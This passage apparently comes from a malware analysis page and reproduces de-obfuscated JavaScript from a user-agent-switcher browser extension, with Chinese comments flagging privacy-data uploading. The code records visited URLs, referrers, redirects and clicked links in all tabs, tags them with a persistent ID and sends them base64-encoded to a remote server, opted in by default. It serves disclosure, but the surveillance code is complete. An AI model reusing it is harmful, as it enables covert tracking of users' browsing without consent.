class="string">"GET"</span>,</div><div class="line">        <span class="attr">url</span>: host + <span class="string">"bhrule?sub="</span> + wid <span class="comment">// 设置推广连接</span></div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            response = <span class="built_in">JSON</span>.parse(response.responseText),</div><div class="line">            rulesObject = response.rules ? response.rules: &#123;&#125;</div><div class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> wrap1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">qs</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">Object</span>.keys(obj).filter(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> ( !! obj[key] || !<span class="number">1</span> === obj[key]) &amp;&amp; <span class="number">-1</span> === filtered.indexOf(key)</div><div class="line">        &#125;).map(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> val = obj[key];</div><div class="line">            <span class="keyword">return</span> <span class="string">"se"</span> === key ? obj[key].map(<span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> key + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(v)</div><div class="line">            &#125;).join(<span class="string">"&amp;"</span>) : ( - <span class="number">1</span> &lt; <span class="string">"sh b a lt zz"</span>.split(<span class="string">" "</span>).indexOf(key) &amp;&amp; (val = <span class="built_in">encodeURIComponent</span>(val || <span class="string">""</span>)), key + <span class="string">"="</span> + val)</div><div class="line">        &#125;).join(<span class="string">"&amp;"</span>)</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// 上传用户的隐私数据</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fetchOverlayPattern</span>(<span class="params">data, callback</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (listenerLast = localStorage.getItem(<span class="string">"listenerLast"</span>), (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - listenerLast &gt; <span class="number">300</span>) &#123;</div><div class="line">            data.tnew = <span class="built_in">Date</span>.now();</div><div class="line">            <span class="keyword">var</span> bqa = qs(data),</div><div class="line">            payload = btoa(bqa),</div><div class="line">            xhr = <span class="keyword">new</span> XMLHttpRequest;</div><div class="line">            xhr.open(<span class="string">"POST"</span>, configFetcher.MainLocator() + main_route, !<span class="number">0</span>),</div><div class="line">            xhr.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>),</div><div class="line">            xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (<span class="number">200</span> == <span class="keyword">this</span>.status) <span class="keyword">try</span> &#123;</div><div class="line">                    callback(<span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.response))</div><div class="line">                &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">            &#125;,</div><div class="line">            xhr.send([<span class="string">"e"</span>, <span class="built_in">encodeURIComponent</span>(btoa(payload))].join(<span class="string">"="</span>)),</div><div class="line">            localStorage.setItem(<span class="string">"listenerLast"</span>, (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime())</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">TabList</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> hash = &#123;&#125;,</div><div class="line">        lp = <span class="string">""</span>,</div><div class="line">        lpi = <span class="keyword">void</span> <span class="number">0</span>;</div><div class="line">        <span class="keyword">return</span> &#123;</div><div class="line">            <span class="attr">remove</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid</span>) </span>&#123;</div><div class="line">                <span class="keyword">delete</span> hash[tid]</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">edit</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid, props</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> tid ? (hash[tid] || <span class="keyword">this</span>.clear(tid), <span class="built_in">Object</span>.keys(props || &#123;&#125;).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</div><div class="line">                    hash[tid][key] = props[key]</div><div class="line">                &#125;), hash[tid]) : <span class="literal">null</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">request</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tabId, tab</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (configFetcher.IsEnable() &amp;&amp; toggler.isOn()) &#123;</div><div class="line">                    <span class="keyword">if</span> (!hash[tabId] || hash[tabId].p &amp;&amp; !hash[tabId].replaced) <span class="keyword">return</span> <span class="keyword">void</span> <span class="keyword">this</span>.clear(tabId);</div><div class="line">                    <span class="keyword">var</span> currTab = hash[tabId] || &#123;&#125;,</div><div class="line">                    url = validateUrl(tab.url);</div><div class="line">                    url &amp;&amp; (currTab.hh || lp != tab.url) &amp;&amp; (tab.active || hash[tabId].fr || hash[tabId].uk.push(<span class="string">"background_auto_reloading"</span>), hash[tabId].dada &amp;&amp; hash[hash[tabId].dada] &amp;&amp; hash[hash[tabId].dada].retroet &amp;&amp; (hash[tabId].zz = hash[hash[tabId].dada].retroet), fetchOverlayPattern(<span class="keyword">this</span>.edit(tabId, &#123;</div><div class="line">                        <span class="attr">sh</span>: url,</div><div class="line">                        <span class="attr">b</span>: lp</div><div class="line">                    &#125;),</div><div class="line">                    <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;&#125;), tab.active &amp;&amp; (lp = currTab.sh), hash[tabId].zz = <span class="literal">null</span>, hash[tabId].dada = <span class="literal">null</span>),</div><div class="line">                    <span class="keyword">this</span>.clear(tabId),</div><div class="line">                    hash[tabId].sh = url,</div><div class="line">                    hash[tabId].p = !<span class="number">0</span></div><div class="line">                &#125;</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">clear</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid</span>) </span>&#123;</div><div class="line">                hash[tid] = &#123;</div><div class="line">                    <span class="attr">var</span>: version || <span class="string">"missing"</span>,</div><div class="line">                    <span class="attr">val</span>: <span class="number">21</span>,</div><div class="line">                    <span class="attr">un</span>: <span class="string">"1"</span>,</div><div class="line">                    <span class="attr">su</span>: browsername,</div><div class="line">                    <span class="attr">ch</span>: ch,</div><div class="line">                    <span class="attr">new</span>: itemator1,</div><div class="line">                    <span class="attr">exp</span>: guid(),</div><div class="line">                    <span class="attr">sesnew</span>: <span class="string">""</span>,</div><div class="line">                    <span class="attr">d</span>: <span class="number">0</span>,</div><div class="line">                    <span class="attr">se</span>: [],</div><div class="line">                    <span class="attr">restarting</span>: !<span class="number">1</span>,</div><div class="line">                    <span class="attr">sh</span>: (hash[tid] || &#123;&#125;).sh || <span class="literal">null</span>,</div><div class="line">                    <span class="attr">a</span>: (hash[tid] || &#123;&#125;).a || <span class="string">""</span>,</div><div class="line">                    <span class="attr">uk</span>: [],</div><div class="line">                    <span class="attr">fr</span>: !<span class="number">1</span>,</div><div class="line">                    <span class="attr">aj</span>: (hash[tid] || &#123;&#125;).aj || !<span class="number">1</span>,</div><div class="line">                    <span class="attr">replaced</span>: (hash[tid] || &#123;&#125;).replaced || !<span class="number">1</span>,</div><div class="line">                    <span class="attr">hh</span>: (hash[tid] || &#123;&#125;).hh || !<span class="number">1</span>,</div><div class="line">                    <span class="attr">dada</span>: (hash[tid] || &#123;&#125;).dada || <span class="literal">null</span>,</div><div class="line">                    <span class="attr">retroet</span>: (hash[tid] || &#123;&#125;).retroet || <span class="string">""</span>,</div><div class="line">                    <span class="attr">zz</span>: (hash[tid] || &#123;&#125;).zz || <span class="string">""</span></div><div class="line">                &#125;</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">details</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid, cb</span>) </span>&#123;</div><div class="line">                chrome.tabs.get(tid,</div><div class="line">                <span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">                    chrome.runtime.lastError || cb(details)</div><div class="line">                &#125;)</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">lpUpdate</span>: <span class="function"><span class="keyword">function</span>(<span class="params">param</span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> idd = param.id || param;</div><div class="line">                lpi = param.id || <span class="keyword">void</span> <span class="number">0</span>,</div><div class="line">                lp = (hash[idd] || &#123;&#125;).sh || lp</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">getLpi</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> lpi</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validateUrl</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span> === url.indexOf(<span class="string">"http"</span>) &amp;&amp; <span class="number">-1</span> === url.indexOf(<span class="string">"://localhost"</span>) &amp;&amp; <span class="number">-1</span> === url.indexOf(<span class="string">"chrome/newtab"</span>) &amp;&amp; <span class="number">0</span> !== url.indexOf(<span class="string">"chrome-"</span>) &amp;&amp; <span class="number">0</span> !== url.indexOf(<span class="string">"about:"</span>) &amp;&amp; <span class="number">-1</span> === url.indexOf(<span class="string">"chrome://"</span>) ? url: <span class="literal">null</span></div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reselected</span>(<span class="params">tid</span>) </span>&#123;</div><div class="line">        tablist.details((tid || &#123;&#125;).tabId || tid, tablist.lpUpdate)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onUpdated</span>(<span class="params">tabId, details, tab</span>) </span>&#123;</div><div class="line">        details &amp;&amp; <span class="string">"complete"</span> === details.status &amp;&amp; (tablist.edit(tabId).p &amp;&amp; tablist.edit(tabId).aj &amp;&amp; tablist.edit(tabId, &#123;</div><div class="line">            <span class="attr">sh</span>: <span class="keyword">void</span> <span class="number">0</span>,</div><div class="line">            <span class="attr">p</span>: !<span class="number">1</span>,</div><div class="line">            <span class="attr">aj</span>: !<span class="number">1</span></div><div class="line">        &#125;), tablist.edit(tabId, &#123;</div><div class="line">            <span class="attr">ng</span>: <span class="string">"ajax"</span>,</div><div class="line">            <span class="attr">aj</span>: !<span class="number">0</span></div><div class="line">        &#125;), tablist.request(tabId, tab), tablist.edit(tabId, &#123;</div><div class="line">            <span class="attr">replaced</span>: !<span class="number">1</span></div><div class="line">        &#125;))</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onReplaced</span>(<span class="params">addedTabId, removedTabId</span>) </span>&#123;</div><div class="line">        tablist.edit(addedTabId, &#123;</div><div class="line">            <span class="attr">replaced</span>: !<span class="number">0</span></div><div class="line">        &#125;),</div><div class="line">        tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || &#123;&#125;).tabId || addedTabId))</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onBeforeSendHeaders</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">hh</span>: !<span class="number">0</span></div><div class="line">        &#125;),</div><div class="line">        details.requestHeaders.some(<span class="function"><span class="keyword">function</span>(<span class="params">rh</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="regexp">/^Referer$/i</span>.test(rh.name) &amp;&amp; tablist.edit(details.tabId, &#123;</div><div class="line">                <span class="attr">a</span>: rh.value</div><div class="line">            &#125;)</div><div class="line">        &#125;) || tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">a</span>: <span class="string">""</span></div><div class="line">        &#125;),</div><div class="line">        &#123;</div><div class="line">            <span class="attr">requestHeaders</span>: details.requestHeaders</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onCommitted</span>(<span class="params">dtls</span>) </span>&#123;</div><div class="line">        dtls = dtls || &#123;&#125;;</div><div class="line">        <span class="keyword">var</span> tid = dtls.tabId,</div><div class="line">        tsh = dtls.transitionQualifiers;</div><div class="line">        tid &amp;&amp; <span class="number">0</span> === dtls.frameId &amp;&amp; (tablist.edit(tid, &#123;</div><div class="line">            <span class="attr">ng</span>: dtls.transitionType,</div><div class="line">            <span class="attr">tsh</span>: tsh</div><div class="line">        &#125;), /client_redirect/.test(tsh) &amp;&amp; tablist.edit(tid, &#123;</div><div class="line">            <span class="attr">lt</span>: dtls.url</div><div class="line">        &#125;), /server_redirect/.test(tsh), tablist.details(tid, tablist.request.bind(tablist, (tid || &#123;&#125;).tabId || tid)))</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cwonRemoved</span>(<span class="params">windowID</span>) </span>&#123;</div><div class="line">        ct.query(&#123;</div><div class="line">            <span class="attr">active</span>: !<span class="number">0</span></div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">tabs</span>) </span>&#123;</div><div class="line">            tabs[<span class="number">0</span>] &amp;&amp; tablist.lpUpdate(tabs[<span class="number">0</span>])</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cwonFocused</span>(<span class="params">window</span>) </span>&#123;</div><div class="line">        cw.WINDOW_ID_NONE != <span class="built_in">window</span> &amp;&amp; ct.query(&#123;</div><div class="line">            <span class="attr">windowId</span>: <span class="built_in">window</span>,</div><div class="line">            <span class="attr">active</span>: !<span class="number">0</span></div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">tabs</span>) </span>&#123;</div><div class="line">            tabs[<span class="number">0</span>] &amp;&amp; tabs[<span class="number">0</span>].active &amp;&amp; tablist.lpUpdate(tabs[<span class="number">0</span>])</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onCreated</span>(<span class="params">tab</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> openerTabId = (tablist.edit(tab.id, &#123;</div><div class="line">            <span class="attr">fr</span>: !<span class="number">0</span>,</div><div class="line">            <span class="attr">replaced</span>: !<span class="number">1</span></div><div class="line">        &#125;), tab.openerTabId || tablist.getLpi());</div><div class="line">        tablist.edit(openerTabId),</div><div class="line">        tab.url.length &amp;&amp; tablist.edit(openerTabId) &amp;&amp; tab.url === tablist.edit(openerTabId).sh ? tablist.edit(tab.id).uk.push(<span class="string">"duplication"</span>) : tab.url.length &amp;&amp; ct.query(&#123;</div><div class="line">            <span class="attr">url</span>: tab.url</div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">tabs</span>) </span>&#123; (tabs || []).length &gt; <span class="number">1</span> &amp;&amp; (tablist.edit(tab.id).uk.push(<span class="string">"duplication"</span>), tablist.edit(tab.id).uk.push(<span class="string">"background_duplication"</span>))</div><div class="line">        &#125;),</div><div class="line">        <span class="string">"complete"</span> != tab.status || tab.openerTabId || tablist.edit(tab.id).uk.push(<span class="string">"reopening"</span>),</div><div class="line">        tablist.edit(tab.id, &#123;</div><div class="line">            <span class="attr">dada</span>: openerTabId</div><div class="line">        &#125;)</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">guid</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> guid = localStorage.getItem(guid_key);</div><div class="line">        <span class="keyword">if</span> (!guid) &#123;</div><div class="line">            <span class="keyword">var</span> g = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> (<span class="number">65536</span> * (<span class="number">1</span> + <span class="built_in">Math</span>.random(<span class="built_in">Date</span>.now() + <span class="number">12</span>)) | <span class="number">0</span>).toString(<span class="number">30</span>).substring(<span class="number">1</span>)</div><div class="line">            &#125;;</div><div class="line">            guid = g() + g() + g() + g() + g() + g() + g() + g() + g(),</div><div class="line">            localStorage.setItem(guid_key, guid)</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> guid</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> itemator1 = <span class="number">310</span>,</div><div class="line">    version = chrome.runtime.getManifest().version,</div><div class="line">    main_route = (localStorage.serverInfo &amp;&amp; <span class="built_in">JSON</span>.parse(localStorage.serverInfo), <span class="string">"/logic/page/data"</span>),</div><div class="line">    guid_key = <span class="string">"uaswitcherk"</span>,</div><div class="line">    skeys = [<span class="string">"o"</span>, <span class="string">"u"</span>],</div><div class="line">    ch = <span class="number">4</span>,</div><div class="line">    browsername = <span class="string">"chrome"</span>,</div><div class="line">    toggler = <span class="keyword">new</span></div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            localStorage.setItem(localKey, isOn ? <span class="number">1</span> : <span class="number">0</span>)</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">_optTurnOn</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">        <span class="keyword">var</span> isOn = !<span class="number">0</span>,</div><div class="line">        localKey = <span class="string">"isdugnlkWfmgosd2"</span>;</div><div class="line">        <span class="keyword">this</span>.turnOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            isOn = !<span class="number">0</span>,</div><div class="line">            save(),</div><div class="line">            _optTurnOn()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.turnOff = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            isOn = !<span class="number">1</span>,</div><div class="line">            save()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.isOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> isOn</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.whenOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.isOn() ? <span class="built_in">Promise</span>.resolve(!<span class="number">0</span>) : <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>) </span>&#123;</div><div class="line">                _optTurnOn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                    resolve()</div><div class="line">                &#125;</div><div class="line">            &#125;)</div><div class="line">        &#125;,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> val = localStorage.getItem(localKey),</div><div class="line">            intVal = <span class="built_in">parseInt</span>(val);</div><div class="line">            isOn = !!<span class="built_in">isNaN</span>(intVal) || <span class="number">1</span> === intVal</div><div class="line">        &#125; ()</div><div class="line">    &#125;,</div><div class="line">    configFetcher = <span class="keyword">new</span></div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> settings = <span class="string">""</span>,</div><div class="line">        setDump = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            localStorage.setItem(<span class="string">"uasc"</span>, <span class="built_in">JSON</span>.stringify(settings))</div><div class="line">        &#125;,</div><div class="line">        setUp = <span class="function"><span class="keyword">function</span>(<span class="params">endpt</span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> cb = <span class="function"><span class="keyword">function</span>(<span class="params">sts, resp</span>) </span>&#123;</div><div class="line">                sts &amp;&amp; (settings = <span class="built_in">JSON</span>.parse(resp), setDump())</div><div class="line">            &#125;,</div><div class="line">            xhr = <span class="keyword">new</span> XMLHttpRequest;</div><div class="line">            xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">                <span class="number">4</span> == xhr.readyState &amp;&amp; cb.apply(<span class="literal">null</span>, [<span class="number">200</span> == xhr.status, xhr.responseText].concat(<span class="built_in">arguments</span>))</div><div class="line">            &#125;,</div><div class="line">            xhr.open(<span class="string">"GET"</span>, endpt + <span class="string">"?"</span> +</div><div class="line">            <span class="function"><span class="keyword">function</span>(<span class="params">arr</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="built_in">Object</span>.keys(arr).map(<span class="function"><span class="keyword">function</span>(<span class="params">hashed</span>) </span>&#123;</div><div class="line">                    <span class="keyword">return</span> hashed + <span class="string">"="</span> + arr[hashed]</div><div class="line">                &#125;).join(<span class="string">"&amp;"</span>)</div><div class="line">            &#125; (&#123;</div><div class="line">                <span class="attr">s</span>: itemator1,</div><div class="line">                <span class="attr">ver</span>: version</div><div class="line">            &#125;), !<span class="number">0</span>),</div><div class="line">            xhr.send()</div><div class="line">        &#125;; !</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> p = localStorage.getItem(<span class="string">"uasc"</span>);</div><div class="line">            settings = p ? <span class="built_in">JSON</span>.parse(p) : settings</div><div class="line">        &#125; (),</div><div class="line">        toggler.whenOn().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            setUp(<span class="string">"https://uaswitcher.org/splash"</span>)</div><div class="line">        &#125;),</div><div class="line">        <span class="keyword">this</span>.enablator = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            settings[skeys[<span class="number">0</span>]] = <span class="number">1</span>,</div><div class="line">            setDump()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.disablator = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            settings[skeys[<span class="number">0</span>]] = <span class="number">0</span>,</div><div class="line">            setDump()</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.IsEnable = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="built_in">Boolean</span>(settings &amp;&amp; settings[skeys[<span class="number">0</span>]])</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">this</span>.MainLocator = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> settings &amp;&amp; settings[skeys[<span class="number">1</span>]]</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">    filtered = [<span class="string">"restarting"</span>, <span class="string">"hh"</span>, <span class="string">"p"</span>, <span class="string">"fr"</span>, <span class="string">"aj"</span>, <span class="string">"replaced"</span>, <span class="string">"retroet"</span>, <span class="string">"dada"</span>],</div><div class="line">    listenerLast = localStorage.getItem(<span class="string">"listenerLast"</span>) || <span class="number">0</span>,</div><div class="line">    tablist = <span class="keyword">new</span> TabList,</div><div class="line">    ct = (chrome.browserAction, chrome.tabs),</div><div class="line">    wr = chrome.webRequest,</div><div class="line">    wn = chrome.webNavigation,</div><div class="line">    cw = chrome.windows;</div><div class="line">    chrome.runtime.onMessage.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">request, sender</span>) </span>&#123;</div><div class="line">        request.href ? tablist.edit(sender.tab.id, &#123;</div><div class="line">            <span class="attr">zz</span>: request.href</div><div class="line">        &#125;) : request.ahref &amp;&amp; tablist.edit(sender.tab.id, &#123;</div><div class="line">            <span class="attr">retroet</span>: request.ahref</div><div class="line">        &#125;)</div><div class="line">    &#125;),</div><div class="line">    cw.getAll(&#123;</div><div class="line">        <span class="attr">populate</span>: !<span class="number">0</span></div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">windows</span>) </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> w = <span class="number">0</span>; w &lt; windows.length; w++) <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; windows[w].tabs.length; i++) validateUrl(windows[w].tabs[i].url) &amp;&amp; (tablist.edit(windows[w].tabs[i].id, &#123;</div><div class="line">            <span class="attr">sh</span>: windows[w].tabs[i].url,</div><div class="line">            <span class="attr">restarting</span>: !<span class="number">0</span></div><div class="line">        &#125;), windows[w].focused &amp;&amp; windows[w].tabs[i].active &amp;&amp; tablist.lpUpdate(windows[w].tabs[i]))</div><div class="line">    &#125;),</div><div class="line">    ct.onUpdated.addListener(onUpdated),</div><div class="line">    ct.onReplaced.addListener(onReplaced);</div><div class="line">    <span class="keyword">var</span> repertuar = &#123;</div><div class="line">        <span class="attr">types</span>: [<span class="string">"main_frame"</span>],</div><div class="line">        <span class="attr">urls</span>: [<span class="string">"&lt;all_urls&gt;"</span>]</div><div class="line">    &#125;;</div><div class="line">    <span class="keyword">return</span> wr.onBeforeRequest.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        validateUrl(details.url) &amp;&amp; tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">sh</span>: <span class="keyword">void</span> <span class="number">0</span>,</div><div class="line">            <span class="attr">p</span>: !<span class="number">1</span>,</div><div class="line">            <span class="attr">aj</span>: !<span class="number">1</span></div><div class="line">        &#125;)</div><div class="line">    &#125;,</div><div class="line">    repertuar, [<span class="string">"blocking"</span>]),</div><div class="line">    wr.onBeforeRedirect.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        validateUrl(details.url) &amp;&amp; tablist.edit(details.tabId).se.push(details.url)</div><div class="line">    &#125;,</div><div class="line">    repertuar),</div><div class="line">    wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, [<span class="string">"blocking"</span>, <span class="string">"requestHeaders"</span>]),</div><div class="line">    wr.onHeadersReceived.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        tablist.edit(details.tabId, &#123;</div><div class="line">            <span class="attr">hh</span>: !<span class="number">0</span></div><div class="line">        &#125;)</div><div class="line">    &#125;,</div><div class="line">    repertuar),</div><div class="line">    wn.onCommitted.addListener(onCommitted),</div><div class="line">    ct.onRemoved.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">tabId</span>) </span>&#123;</div><div class="line">        tablist.remove(tabId)</div><div class="line">    &#125;),</div><div class="line">    cw.onRemoved.addListener(cwonRemoved),</div><div class="line">    ct.onCreated.addListener(onCreated),</div><div class="line">    cw.onFocusChanged.addListener(cwonFocused),</div><div class="line">    ct.onActivated ? ct.onActivated.addListener(reselected) : ct.onSelectionChanged.addListener(reselected),</div><div class="line">    wr.onErrorOccurred.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">details</span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            tablist.edit(details.tabId, &#123;</div><div class="line">                <span class="attr">se</span>: <span class="literal">null</span></div><div class="line">            &#125;)</div><div class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">    &#125;,</div><div class="line">    repertuar),</div><div class="line">    &#123;</div><div class="line">        <span class="attr">optin</span>: toggler.turnOn,</div><div class="line">        <span class="attr">optout</span>: toggler.turnOff,</div><div class="line">        <span class="attr">isopt</span>: toggler.isOn,</div><div class="line">        <span class="attr">whenopt</span>: toggler.whenOn()</div><div class="line">    &#125;</div><div class="line">&#125; ();</div><div class="line">wrap1.optin(),</div><div class="line">chrome.tabs.onUpdated.addListener(<span class="function"><span class="keyword">function</span>(<span class="params">tabId</span>) </span>&#123;</div><div class="line">    chrome.tabs.get(tabId,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">tab</span>) </span>&#123;</div><div class="line">        <span class="string">"loading"</span> == tab.status &amp;&amp; chrome.tabs.executeScript(tab.id, &#123;</div><div class="line">            <span class="attr">code</span>: <span class="string">`</span></div><div class="line">            if (!document.getElementById("sbmarwusasv5")) &#123;</div><div class="line">                var flag = document.createElement("span");</div><div class="line">                flag.id = "sbmarwusasv5";</div><div class="line">                document.body.appendChild(flag);</div><div class="line"></div><div class="line">                document.body.addEventListener("click",</div><div class="line">                function(event) &#123;</div><div class="line">                    try &#123;</div><div class="line">                        if (event.target.href) &#123;</div><div class="line">                            chrome.runtime.sendMessage(&#123;</div><div class="line">                                href: event.target.href,</div><div class="line">                                listener: "usassmwv5"</div><div class="line">                            &#125;);</div><div class="line">                        &#125;</div><div class="line">                    &#125; catch(e) &#123;</div><div class="line">                        console.log(e);</div><div class="line">                    &#125;</div><div class="line">                &#125;);</div><div class="line"></div><div class="line">                document.body.addEventListener("contextmenu",</div><div class="line">                function(event) &#123;</div><div class="line">                    if (event.target.href) &#123;</div><div class="line">                        chrome.runtime.sendMessage(&#123;</div><div class="line">                            ahref: event.target.href,</div><div class="line">                            listener: "usassmwv5"</div><div class="line">                        &#125;);</div><div class="line">                    &#125;</div><div class="line">                    return false;</div><div class="line">                &#125;,</div><div class="line">                false);</div><div class="line"></div><div class="line">                document.body.addEventListener("auxclick",</div><div class="line">                function(event) &#123;</div><div class="line">                    if (event.target.href) &#123;</div><div class="line">                        